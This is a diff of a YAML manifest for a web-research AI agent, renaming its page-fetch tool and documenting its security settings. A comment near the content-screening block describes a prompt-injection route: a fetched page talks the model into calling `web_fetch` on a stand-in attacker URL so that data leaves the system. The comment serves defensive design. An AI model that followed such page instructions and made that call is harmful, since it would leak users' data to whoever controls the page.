@@ -37,41 +37,48 @@ spec:
     - list_skills
 
   # Guidance for the retrieval pair, appended to the prompt only while each tool is bound —
-  # it used to live in `system_prompt`, where removing `fetch` would have left the prompt
+  # it used to live in `system_prompt`, where removing `web_fetch` would have left the prompt
   # recommending it.
   tool_guidance:
     search: Use `search` to find sources; a result is a title, URL and snippet, not the page.
-    fetch: Use `fetch` to read a page before relying on it, and quote what the page says.
+    web_fetch: >-
+      Use `web_fetch` to read a page before relying on it. Its `prompt` says what to
+      pull out, and asking for exact quotes is how to cite what the page says.
 
   # A research agent that cannot retrieve is a contradiction; until these existed this
   # manifest declared `pattern: deep` and could only do arithmetic. `search` finds sources,
-  # `fetch` reads them — the two halves are useless apart.
+  # `web_fetch` reads them — the two halves are useless apart.
   search_tools:
     - name: search
       description: >-
         Search the web for sources. Returns ranked titles, URLs and snippets;
-        follow up with `fetch` to read a result rather than trusting the snippet.
+        follow up with `web_fetch` to read a result rather than trusting the snippet.
       max_results: 8
 
   http_tools:
-    - name: fetch
+    - name: web_fetch
       description: >-
-        Read a web page found via `search`. Quote what the page says rather than
-        summarising from the snippet.
+        Read a web page found via `search`, asking `prompt` for what you need from
+        it. Rely on the page rather than the search snippet.
       # Unconfined on purpose, and the one manifest here where that is the honest
       # setting: research means reading pages nobody listed in advance. This is what
       # `content_screening` below is for — every fetched page is treated as hostile.
       allow_any_host: true
       max_bytes: 80000
       timeout_ms: 20000
+      # A cheap model reads the page and answers `prompt`, so an 80 KB page costs the agent a
+      # paragraph of context. That saves context and cost; it is not a security boundary.
+      # The route needs a working key of its own: on an install with no Anthropic key, point
+      # this at a route you have, or every fetch reports `extraction failed`.
+      extract_model: claude-haiku
 
   # Required by the two tools above, not decoration. Search snippets are written by whoever
   # ranked for the query and fetched pages are wholly attacker-controlled, so both arrive as
   # untrusted output. Marker screening only (no `model:`), so it costs nothing per call.
   #
   # Read what this does and does not cover. It screens what comes *back*; the URL the model
-  # hands to `fetch` passes through no screener, so a page that talks the model into
-  # `fetch("https://attacker/?d=…")` is not stopped here. That is why inbound auth is on
+  # hands to `web_fetch` passes through no screener, so a page that talks the model into
+  # `web_fetch("https://attacker/?d=…")` is not stopped here. That is why inbound auth is on
   # above, and why an operator wanting a stronger control sets `model:` and `on_flag: block`.
   content_screening:
     enabled: true
@@ -90,7 +97,7 @@ spec:
   auth:
     inbound:
       # Deliberately *not* anonymous, unlike `quick` and `support`. Anonymous access to this
-      # manifest used to buy a calculator; with `fetch` bound unconfined it buys a
+      # manifest used to buy a calculator; with `web_fetch` bound unconfined it buys a
       # general-purpose egress primitive, and the two are not the same offer.
       allow_anonymous: false
 
